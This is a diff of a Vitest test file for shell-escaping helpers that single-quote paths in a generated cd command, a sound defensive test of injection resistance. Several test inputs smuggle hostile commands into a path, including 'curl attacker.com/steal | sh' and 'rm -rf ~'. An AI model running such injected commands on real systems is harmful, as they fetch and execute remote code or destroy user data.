@@ -1,56 +1,81 @@
 import { describe, it, expect } from "vitest";
-import { escapeForShellSingleQuote, cdCommand } from "./shell.ts";
+import { shellEscape, formatCdCommand } from "./shell.ts";
 
-describe("escapeForShellSingleQuote", () => {
-  it("returns unchanged string when no single quotes present", () => {
-    expect(escapeForShellSingleQuote("/tmp/my-repo")).toBe("/tmp/my-repo");
+describe("shellEscape", () => {
+  it("returns unchanged string without single quotes", () => {
+    expect(shellEscape("/tmp/mock-repo")).toBe("/tmp/mock-repo");
   });
 
-  it("escapes a single quote in the middle of a string", () => {
-    expect(escapeForShellSingleQuote("it's")).toBe("it'\\''s");
+  it("escapes single quotes", () => {
+    expect(shellEscape("it's")).toBe("it'\\''s");
   });
 
   it("escapes multiple single quotes", () => {
-    expect(escapeForShellSingleQuote("it's a 'test'")).toBe("it'\\''s a '\\''test'\\''");
+    expect(shellEscape("a'b'c")).toBe("a'\\''b'\\''c");
   });
 
   it("escapes a single quote at the start", () => {
-    expect(escapeForShellSingleQuote("'start")).toBe("'\\''start");
+    expect(shellEscape("'start")).toBe("'\\''start");
   });
 
   it("escapes a single quote at the end", () => {
-    expect(escapeForShellSingleQuote("end'")).toBe("end'\\''");
+    expect(shellEscape("end'")).toBe("end'\\''");
   });
 
   it("handles empty string", () => {
-    expect(escapeForShellSingleQuote("")).toBe("");
+    expect(shellEscape("")).toBe("");
   });
 
   it("handles string that is only a single quote", () => {
-    expect(escapeForShellSingleQuote("'")).toBe("'\\''");
+    expect(shellEscape("'")).toBe("'\\''");
+  });
+
+  it("does not escape double quotes", () => {
+    expect(shellEscape('path "with" doubles')).toBe('path "with" doubles');
+  });
+
+  it("does not escape dollar signs", () => {
+    expect(shellEscape("$HOME/repo")).toBe("$HOME/repo");
+  });
+
+  it("does not escape backticks", () => {
+    expect(shellEscape("path`cmd`")).toBe("path`cmd`");
   });
 });
 
-describe("cdCommand", () => {
-  it("wraps a simple path in single quotes", () => {
-    expect(cdCommand("/tmp/my-repo")).toBe("cd '/tmp/my-repo'");
+describe("formatCdCommand", () => {
+  it("formats simple path", () => {
+    expect(formatCdCommand("/tmp/repo")).toBe("cd '/tmp/repo'");
   });
 
-  it("escapes single quotes in paths", () => {
-    expect(cdCommand("/tmp/it's-a-repo")).toBe("cd '/tmp/it'\\''s-a-repo'");
+  it("escapes single quotes in path", () => {
+    expect(formatCdCommand("/tmp/repo's")).toBe("cd '/tmp/repo'\\''s'");
+  });
+
+  it("keeps backticks and dollar signs safe inside single quotes", () => {
+    const path = "/tmp/`whoami`/$USER/repo";
+    const result = formatCdCommand(path);
+    // Backticks and $ are inert inside single quotes in POSIX shells
+    expect(result).toBe("cd '/tmp/`whoami`/$USER/repo'");
   });
 
   it("handles path with shell injection attempt", () => {
     const maliciousPath = "/tmp/x'; curl attacker.com/steal | sh; echo '";
-    const result = cdCommand(maliciousPath);
+    const result = formatCdCommand(maliciousPath);
     expect(result).toBe("cd '/tmp/x'\\''; curl attacker.com/steal | sh; echo '\\'''");
   });
 
-  it("handles path with spaces", () => {
-    expect(cdCommand("/tmp/my repo/path")).toBe("cd '/tmp/my repo/path'");
+  it("prevents shell injection with rm payload", () => {
+    const malicious = "/tmp/repo'; rm -rf ~; echo '";
+    const result = formatCdCommand(malicious);
+    expect(result).toContain("cd '");
+    expect(result).toContain("'\\''");
+    // Verify both quotes were escaped (input has 2 single quotes)
+    const escapeCount = result.split("'\\''").length - 1;
+    expect(escapeCount).toBe(2);
   });
 
-  it("handles path with special characters but no single quotes", () => {
-    expect(cdCommand("/tmp/$HOME/path")).toBe("cd '/tmp/$HOME/path'");
+  it("handles path with spaces", () => {
+    expect(formatCdCommand("/tmp/my repo/path")).toBe("cd '/tmp/my repo/path'");
   });
 });
